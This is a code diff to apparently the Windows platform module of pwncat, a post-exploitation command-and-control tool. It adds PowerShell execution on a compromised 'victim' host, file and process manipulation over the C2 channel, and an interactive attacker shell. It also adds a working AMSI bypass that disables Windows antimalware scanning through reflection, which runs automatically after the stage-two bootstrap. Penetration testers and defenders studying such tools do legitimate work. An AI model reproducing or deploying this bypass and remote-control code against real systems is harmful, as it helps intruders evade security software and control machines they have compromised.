@@ -1,17 +1,23 @@
 #!/usr/bin/env python3
 from io import RawIOBase, TextIOWrapper, BufferedIOBase, UnsupportedOperation
-from typing import List, Union
+from typing import List, Union, BinaryIO
 from io import StringIO, BytesIO
 from subprocess import CalledProcessError, TimeoutExpired
 from dataclasses import dataclass
+import termios
 import subprocess
 import textwrap
 import pkg_resources
+import readline
 import pathlib
 import base64
+import shutil
+import json
+import gzip
 import time
 import gzip
 import stat
+import sys
 import os
 
 import pwncat
@@ -20,6 +26,14 @@ import pwncat.util
 from pwncat.platform import Platform, PlatformError, Path
 
 INTERACTIVE_END_MARKER = b"\nINTERACTIVE_COMPLETE\r\n"
+
+
+class PowershellError(Exception):
+    """ Executing a powershell script caused an error """
+
+    def __init__(self, errors):
+        self.errors = json.loads(errors)
+        super().__init__(self.errors[0]["Message"])
 
 
 @dataclass
@@ -57,12 +71,13 @@ class stat_result:
 class WindowsFile(RawIOBase):
     """ Wrapper around file handles on Windows """
 
-    def __init__(self, platform: "Windows", mode: str, handle: int):
+    def __init__(self, platform: "Windows", mode: str, handle: int, name: str = None):
         self.platform = platform
         self.mode = mode
         self.handle = handle
         self.is_open = True
         self.eof = False
+        self.name = name
 
     def readable(self) -> bool:
         return "r" in self.mode
@@ -76,7 +91,8 @@ class WindowsFile(RawIOBase):
         if not self.is_open:
             return
 
-        self.platform.channel.send(f"close\n{self.handle}\n".encode("utf-8"))
+        self.platform.run_method("File", "close")
+        self.platform.channel.sendline(str(self.handle).encode("utf-8"))
         self.is_open = False
 
         return
@@ -99,7 +115,8 @@ class WindowsFile(RawIOBase):
         if self.eof:
             return 0
 
-        self.platform.channel.send(f"read\n{self.handle}\n{len(b)}\n".encode("utf-8"))
+        self.platform.run_method("File", "read")
+        self.platform.channel.sendline(str(len(b)).encode("utf-8"))
         count = int(self.platform.channel.recvuntil(b"\n").strip())
 
         if count == 0:
@@ -126,9 +143,14 @@ class WindowsFile(RawIOBase):
         nwritten = 0
         while nwritten < len(data):
             chunk = data[nwritten:]
-            self.platform.channel.send(
-                f"write\n{self.handle}\n{len(chunk)}\n".encode("utf-8") + chunk
-            )
+
+            payload = BytesIO()
+            with gzip.GzipFile(fileobj=payload, mode="wb") as gz:
+                gz.write(chunk)
+
+            self.platform.run_method("File", "write")
+            self.platform.channel.sendline(str(self.handle).encode("utf-8"))
+            self.platform.channel.sendline(base64.b64encode(payload.getbuffer()))
             nwritten += int(
                 self.platform.channel.recvuntil(b"\n").strip().decode("utf-8")
             )
@@ -218,7 +240,9 @@ class PopenWindows(pwncat.subprocess.Popen):
         if self.returncode is not None:
             return
 
-        self.platform.channel.send(f"kill\n{self.handle}\n0\n".encode("utf-8"))
+        self.platform.run_method("Process", "kill")
+        self.platform.channel.sendline(str(self.handle).encode("utf-8"))
+        self.platform.channel.sendline(b"0")
         self.returncode = -1
 
     def poll(self):
@@ -227,7 +251,8 @@ class PopenWindows(pwncat.subprocess.Popen):
         if self.returncode is not None:
             return self.returncode
 
-        self.platform.channel.send(f"ppoll\n{self.handle}\n".encode("utf-8"))
+        self.platform.run_method("Process", "poll")
+        self.platform.channel.sendline(str(self.handle).encode("utf-8"))
         result = self.platform.channel.recvuntil(b"\n").strip().decode("utf-8")
 
         if result == "E":
@@ -361,11 +386,19 @@ class Windows(Platform):
         # is difficult this early. We will assume there isn't one.
         self.has_pty = True
 
+        # Tracks paths to modules which have been sideloaded into powershell
+        self.psmodules = []
+
         self._bootstrap_stage_two()
 
         # Load requested libraries
         # for library, methods in self.LIBRARY_IMPORTS.items():
         #     self._load_library(library, methods)
+
+    def run_method(self, typ: str, method: str):
+        """ Run a method reflectively from the loaded StageTwo assembly """
+
+        self.channel.send(f"{typ}\n{method}\n".encode("utf-8"))
 
     def _bootstrap_stage_two(self):
         """This takes the stage one C2 (powershell) and boostraps it for stage
@@ -504,6 +537,11 @@ class Windows(Platform):
         # Read host-specific GUID
         self.host_uuid = self.channel.recvline().strip().decode("utf-8")
 
+        # Bypass AMSI
+        self.powershell(
+            """$am = ([Ref].Assembly.GetTypes()  | % { If ( $_.Name -like "*iUtils" ){$_} })[0];$con = ($am.GetFields('NonPublic,Static') | % { If ( $_.Name -like "*Context" ){$_} })[0];$addr = $con.GetValue($null);[IntPtr]$ptr = $addr;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);"""
+        )
+
     def get_pty(self):
         """ We don't need to do this for windows """
 
@@ -546,7 +584,8 @@ class Windows(Platform):
         elif not isinstance(args, str):
             raise ValueError("expected command string or list of arguments")
 
-        self.channel.send(f"""process\n{args}\n""".encode("utf-8"))
+        self.run_method("Process", "start")
+        self.channel.sendline(args.encode("utf-8"))
 
         hProcess = self.channel.recvuntil(b"\n").strip().decode("utf-8")
         if hProcess == "E:IN":
@@ -585,6 +624,47 @@ class Windows(Platform):
         """
         return self.host_uuid
 
+    def interactive_read(self):
+        """
+        Read data from the attacker to be sent directly to the victim
+        """
+
+        try:
+            data = input().encode("utf-8") + b"\r"
+            return data
+        except EOFError:
+            raise RawModeExit
+
+    def interactive_loop(self):
+        """
+        Interactively read input from the attacker and send it to an interactive
+        terminal on the victim. `RawModeExit` and `ChannelClosed` exceptions
+        are handled by the manager appropriately. If any changes are made to the
+        local TTY, they should be reverted before returning (ideally via a try-finally
+        block). Output from the remote host is automatically piped to stdout via
+        a background thread by the manager.
+        """
+
+        pwncat.util.push_term_state()
+
+        try:
+            while True:
+                try:
+                    data = input()
+                    if data.strip() == "exit":
+                        raise pwncat.util.RawModeExit
+
+                    self.channel.send(data.encode("utf-8") + b"\r")
+                except KeyboardInterrupt:
+                    sys.stdout.write("\n")
+                    self.session.manager.log(
+                        "[yellow]warning[/yellow]: Ctrl-C does not work for windows targets"
+                    )
+        except EOFError:
+            raise pwncat.util.RawModeExit
+        finally:
+            pwncat.util.pop_term_state()
+
     @property
     def interactive(self):
         return self._interactive
@@ -600,7 +680,7 @@ class Windows(Platform):
         if value:
             # Shift to interactive mode
             cols, rows = os.get_terminal_size()
-            self.channel.send(f"\ninteractive\n{rows}\n{cols}\n".encode("utf-8"))
+            self.run_method("PowerShell", "start")
             self._interactive = True
             self.interactive_tracker = 0
             return
@@ -608,19 +688,31 @@ class Windows(Platform):
             if self.interactive_tracker != len(INTERACTIVE_END_MARKER):
                 self.channel.send(b"\rexit\r")
                 self.channel.recvuntil(INTERACTIVE_END_MARKER)
-            self.channel.send(b"nothing\r\n")
             self._interactive = False
 
     def process_output(self, data):
         """ Process stdout while in interactive mode """
 
+        transformed = bytearray(b"")
+        has_cr = False
+
         for b in data:
+            if has_cr and b != ord("\n"):
+                transformed.append(ord("\n"))
+            if b == ord("\r"):
+                has_cr = True
+            else:
+                has_cr = False
+
+            transformed.append(b)
             if INTERACTIVE_END_MARKER[self.interactive_tracker] == b:
                 self.interactive_tracker += 1
                 if self.interactive_tracker == len(INTERACTIVE_END_MARKER):
                     raise pwncat.manager.RawModeExit
             else:
                 self.interactive_tracker = 0
+
+        return transformed
 
     def open(
         self,
@@ -645,17 +737,17 @@ class Windows(Platform):
         if "b" not in mode:
             buffering = -1
 
-        self.channel.send(f"open\n{str(path)}\nmode\n".encode("utf-8"))
+        self.run_method("File", "open")
+        self.channel.sendline(str(path).encode("utf-8"))
+        self.channel.sendline(mode.encode("utf-8"))
         result = self.channel.recvuntil(b"\n").strip()
-
-        self.session.log(result)
 
         try:
             handle = int(result)
         except ValueError:
             raise FileNotFoundError(str(path))
 
-        stream = WindowsFile(self, mode, handle)
+        stream = WindowsFile(self, mode, handle, name=path)
 
         if "b" not in mode:
             stream = TextIOWrapper(
@@ -669,80 +761,113 @@ class Windows(Platform):
 
         return stream
 
-    def _do_which(self):
+    def _do_which(self, path: str):
         """ Stub method """
+
+        try:
+            p = self.run(
+                ["where.exe", path], capture_output=True, text=True, check=True
+            )
+
+            return p.stdout.strip()
+        except CalledProcessError:
+            return None
+
+    def new_item(self, **kwargs):
+        """Run the `New-Item` commandlet with specified arguments and
+        raise the appropriate local exception if requried."""
+
+        command = "New-Item "
+        for arg, value in kwargs.items():
+            if value is None:
+                command += "-" + arg + " "
+            else:
+                command += f'-{arg} "{value}"'
+
+        try:
+            result = self.powershell(command)
+            return result[0]
+        except PowershellError as exc:
+            if "not exist" in exc:
+                raise FileNotFoundError(kwargs["Path"])
+            elif "exist" in exc:
+                raise FileExistsError(kwargs["Path"])
+            elif "directory":
+                raise NotADirectoryError(kwargs["Path"])
+            else:
+                raise PermissionError(kwargs["Path"])
 
     def abspath(self, path: str) -> str:
         """ Convert the given relative path to absolute """
 
-        self.channel.sendline(b"abspath")
-        self.channel.sendline(path.encode("utf-8"))
-
-        result = self.channel.recvline().strip().decode("utf-8")
-        if result.startswith("E:S2:EXCEPTION"):
-            raise FileNotFoundError(result)
-
-        return result
+        try:
+            result = self.powershell(f'Resolve-Path -Path "{path}" | Select Path')
+            return result[0]["Path"]
+        except PowershellError as exc:
+            raise FileNotFoundError(path) from exc
 
     def chdir(self, path: str):
         """ Change the current working directory """
 
-        self.channel.sendline(b"chdir")
-        self.channel.sendline(path.encode("utf-8"))
+        try:
+            result = self.powershell(f'$_ = (pwd) ; cd "{path}" ; $_ | Select Path')
 
-        result = self.channel.recvline().strip().decode("utf-8")
-        if result != "S" and "permission" in result.lower():
-            raise PermissionError(result)
-        elif result != "S":
-            raise FileNotFoundError(result)
-
-        old_cwd = self.cwd
-        self.cwd = path
-
-        return old_cwd
+            return result[0]["Path"]
+        except PowershellError as exc:
+            if "not exist" in str(exc):
+                raise FileNotFoundError(path) from exc
+            raise PermissionError(path) from exc
 
     def chmod(self, path: str, mode: int):
-        """ This method is not valid for windows targets. """
+        """Change a file's mode. Per the python documentation, this is only
+        used to change the read-only flag for the Windows platform."""
 
-        raise NotImplementedError(f"chmod is not valid for {self.name} targets")
+        try:
+            if mode & stat.S_IWRITE:
+                value = "$false"
+            else:
+                value = "$true"
+
+            result = self.powershell(
+                f'Set-ItemProperty -Path "{path}" -Name IsReadOnly -Value {value}'
+            )
+        except PowershellError as exc:
+            if "not exist" in str(exc):
+                raise FileNotFoundError(path) from exc
+            raise PermissionError(path) from exc
 
     def getenv(self, name: str) -> str:
         """ Stub method """
 
-        self.channel.sendline(b"getenv")
-        self.channel.sendline(name.encode("utf-8"))
+        try:
+            result = self.powershell(f"$env:{name}")
+            return result[0]
+        except PowershellError as exc:
+            raise KeyError(name) from exc
 
-        value = ""
+    def link_to(self, target: str, path: str):
+        """ Create hard link at ``path`` pointing to ``target`` """
 
-        while True:
-            line = self.channel.recvline().decode("utf-8")
-            if line.rstrip("\r\n") == "S":
-                break
-            if line.startswith("E:S2:EXCEPTION"):
-                raise KeyError(line)
-            value += line
+        self.new_item(ItemType="HardLink", Path=path, Target=target)
 
-        return value.rstrip("\r\n")
-
-    def link_to(self):
+    def symlink_to(self, target: str, path: str):
         """ Stub method """
+
+        self.new_item(ItemType="SymbolicLink", Path=path, Target=target)
 
     def listdir(self, path: str):
         """ Stub method """
 
-        self.channel.sendline(b"listdir")
-        self.channel.sendline(path.encode("utf-8"))
-
-        entries = []
-        while True:
-            line = self.channel.recvline().rstrip(b"\r\n").decode("utf-8")
-            if line == "S":
-                break
-            if line.startswith("E:S2:EXCEPTION"):
-                raise FileNotFoundError(line)
-            entries.append(line)
-
-        return entries
+        try:
+            result = self.powershell(f'Get-ChildItem -Force -Path "{path}" | Select ')
+            return result[0] if len(result) else []
+        except PowershellError as exc:
+            if "not exist" in str(exc):
+                raise FileNotFoundError(path)
+            elif "directory" in str(exc):
+                raise NotADirectoryError(path)
+            else:
+                raise PermissionError(path)
 
     def lstat(self):
         """ Stub method """
@@ -750,12 +875,7 @@ class Windows(Platform):
     def mkdir(self, path: str):
         """ Stub method """
 
-        self.channel.sendline(b"mkdir")
-        self.channel.sendline(path.encode("utf-8"))
-
-        result = self.channel.recvline().rstrip("\r\n")
-        if result != "S":
-            raise FileNotFoundError(result)
+        self.new_item(ItemType="Directory", Path=path)
 
     def readlink(self):
         """ Stub method """
@@ -766,62 +886,61 @@ class Windows(Platform):
     def rename(self, src: str, dst: str):
         """ Stub method """
 
-        self.channel.sendline(b"rename")
-        self.channel.sendline(src.encode("utf-8"))
-        self.channel.sendline(dst.encode("utf-8"))
+        try:
+            self.powershell(f'Rename-Item -Path "{src}" -NewName "{dst}"')
+        except PowershellError as exc:
+            if "not exist" in str(exc):
+                raise FileNotFoundError(src)
+            raise PermissionError(src)
 
-        result = self.channel.recvline().rstrip("\r\n")
-        if result != "S":
-            raise FileNotFoundError(result)
-
-    def rmdir(self, path: str, recurse: bool):
+    def rmdir(self, path: str, recurse: bool = False):
         """ Stub method """
 
-        self.channel.sendline(b"rmdir")
-        self.channel.sendline(path.encode("utf-8"))
-        self.channel.sendline(str(recurse).encode("utf-8"))
+        # This is a bad solution, but powershell is stupid
+        if not recurse and len(self.listdir(path)) != 0:
+            raise FileNotFoundError(path)
 
-        result = self.channel.recvline().rstrip("\r\n")
-        if result != "S":
-            raise FileNotFoundError(result)
+        try:
+            command = f'Remove-Item -Force -Confirm:$false -Path "{path}"'
+            if recurse:
+                command += " -Recurse"
+            self.powershell(command)
+        except PowershellError as exc:
+            if "not exist" in str(exc) or "empty" in str(exc):
+                raise FileNotFoundError(path)
+            raise PermissionError(path)
 
     def stat(self, path: str):
         """ Stub method """
 
-        self.channel.sendline(b"stat")
-        self.channel.sendline(path.encode("utf-8"))
+        try:
+            props = self.powershell(f'Get-ItemProperty -Path "{path}"')[0]
+        except PowershellError as exc:
+            if "not exist" in str(exc):
+                raise FileNotFoundError(path) from exc
+            raise PermissionError(path) from exc
 
         result = stat_result()
 
-        attrs = self.channel.recvline().rstrip(b"\r\n").decode("utf-8")
-        if attrs.startswith("E:"):
-            raise FileNotFoundError(attrs)
-        attrs = int(attrs)
-
         result.st_ctime_ns = (
-            int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8")) * 100
+            float(props["CreationTimeUtc"].split("(")[1].split(")")[0]) * 1000000.0
         )
         result.st_atime_ns = (
-            int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8")) * 100
+            float(props["LastAccessTimeUtc"].split("(")[1].split(")")[0]) * 1000000.0
         )
         result.st_mtime_ns = (
-            int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8")) * 100
+            float(props["LastWriteTimeUtc"].split("(")[1].split(")")[0]) * 1000000.0
         )
-        result.st_dev = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
-        size_hi = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
-        size_lo = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
-        result.st_size = (size_hi << 32) | (size_lo)
-        result.st_nlink = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
-        ino_hi = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
-        ino_lo = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
-        result.st_ino = (ino_hi << 32) | (ino_lo)
+        result.st_size = props["Length"] if "Length" in props else 0
+        result.st_dev = None
+        result.st_nlink = None
+        result.st_ino = None
+        result.st_file_attributes = props["Attributes"]
+        result.st_reparse_point = 0
 
         result.st_ctime = result.st_ctime_ns / 1000000000.0
         result.st_atime = result.st_atime_ns / 1000000000.0
         result.st_mtime = result.st_mtime_ns / 1000000000.0
-
-        result.st_file_attributes = attrs
-        result.st_reparse_point = 0
 
         if result.st_file_attributes & stat.FILE_ATTRIBUTE_READONLY:
             result.st_mode |= stat.S_IREAD
@@ -837,35 +956,107 @@ class Windows(Platform):
 
         return result
 
-    def symlink_to(self):
+    def tempfile(self, mode: str, suffix: str = None):
         """ Stub method """
 
-    def tempfile(self):
-        """ Stub method """
+        if suffix is None:
+            suffix = ""
+        else:
+            suffix = "." + suffix
+
+        # Get the temporary directory
+        path = self.Path(
+            self.powershell("$_ = [System.IO.Path]::GetTempPath() ; $_")[0]
+        )
+        name = ""
+
+        while True:
+            name = f"tmp{pwncat.util.random_string(length=6)}{suffix}"
+            try:
+                self.new_item(ItemType="File", Path=str(path / name))
+                break
+            except FileExistsError as exc:
+                continue
+
+        return (path / name).open(mode=mode)
 
     def touch(self, path: str):
         """ Stub method """
 
+        try:
+            self.powershell(f'echo $null >> "{path}"')
+        except PowershellError as exc:
+            if "part of the path" in str(exc).lower():
+                raise FileNotFoundError(path)
+            raise PermissionError(path)
+
     def umask(self):
         """ Stub method """
+
+        raise NotImplementedError("windows platform does not support umask")
 
     def unlink(self, path: str):
         """ Stub method """
 
-        self.channel.sendline(b"unlink")
-        self.channel.sendline(path.encode("utf-8"))
+        # This is a bad solution, but powershell is stupid
+        try:
+            if self.Path(path).is_dir() and len(self.listdir(path)) != 0:
+                raise FileNotFoundError(path)
+        except NotADirectoryError:
+            pass
 
-        result = self.channel.recvline().rstrip("\r\n")
-        if result != "S":
-            raise FileNotFoundError(result)
+        try:
+            command = f'Remove-Item -Force -Confirm:$false -Path "{path}"'
+            self.powershell(command)
+        except PowershellError as exc:
+            if "not exist" in str(exc) or "empty" in str(exc):
+                raise FileNotFoundError(path)
+            raise PermissionError(path)
 
     def whoami(self) -> str:
         """ Stub method """
 
-        self.channel.sendline(b"whoami")
+        try:
+            result = self.powershell("whoami")[0]
+            return result
+        except PowershellError as exc:
+            raise OSError from exc
 
-        result = self.channel.recvline().rstrip("\r\n")
-        if result.startswith("E:S2:EXCEPTION"):
-            raise OSError(result)
+    def powershell(self, script: Union[str, BinaryIO], depth: int = 1):
+        """Execute a powershell script in the context of the C2. The results
+        of the command are automatically serialized with ``ConvertTo-Json``.
+        You can control the depth of serialization, although with large objects
+        this may impose significant performance impacts. The default depth
+        is ``1``.
 
-        return result
+        :param script: a powershell script to execute on the target
+        :type script: Union[str, BinaryIO]
+        :param depth: the depth of serialization within the returned object, defaults to ``1``
+        :type depth: int
+        """
+
+        if isinstance(script, str):
+            script = BytesIO(script.encode("utf-8"))
+
+        payload = BytesIO()
+
+        with gzip.GzipFile(fileobj=payload, mode="wb") as gz:
+            shutil.copyfileobj(script, gz)
+
+        self.run_method("PowerShell", "run")
+        self.channel.sendline(base64.b64encode(payload.getbuffer()))
+        self.channel.sendline(str(depth).encode("utf-8"))
+
+        results = []
+        result = self.channel.recvline().strip()
+
+        if result.startswith(b"E:S2:EXCEPTION:"):
+            raise Exception(result.split(b"E:S2:EXCEPTION:")[1].decode("utf-8"))
+        elif result.startswith(b"E:PWSH:"):
+            raise PowershellError(result.split(b"E:PWSH:")[1].decode("utf-8"))
+
+        while result != b"END":
+            results.append(json.loads(result))
+            result = self.channel.recvline().strip()
+
+        return results
